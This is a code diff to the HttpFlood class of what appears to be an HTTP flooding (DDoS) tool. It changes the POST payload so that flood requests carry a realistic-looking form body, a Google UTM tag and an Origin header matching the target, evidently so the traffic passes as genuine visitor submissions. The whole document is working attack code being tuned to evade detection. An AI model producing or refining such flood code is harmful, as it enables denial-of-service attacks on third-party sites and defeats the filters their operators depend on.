@@ -1424,14 +1424,15 @@ class HttpFlood(Thread):
         ua = randchoice(self._useragents)
         headers = self.build_consistent_headers(ua)
         
-        # Build JSON Payload (500-1000 bytes)
-        json_data = f'{{"id": "{uuid4()}", "data": "{ProxyTools.Random.rand_str(randint(500, 1000))}"}}'
+        # Build realistic JSON Payload
+        json_data = f'{{"form_id": "{ProxyTools.Random.rand_str(8)}", "utm_source": "google", "data": "{ProxyTools.Random.rand_str(randint(200, 400))}"}}'
         
         payload = (f"POST {path} HTTP/1.1\r\n"
                    f"Host: {self._target.authority}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"{headers}"
                    f"Content-Type: application/json\r\n"
+                   f"Origin: {self._target.scheme}://{self._target.authority}\r\n"
                    f"Content-Length: {len(json_data)}\r\n\r\n"
                    f"{json_data}").encode("utf-8")
         s = None
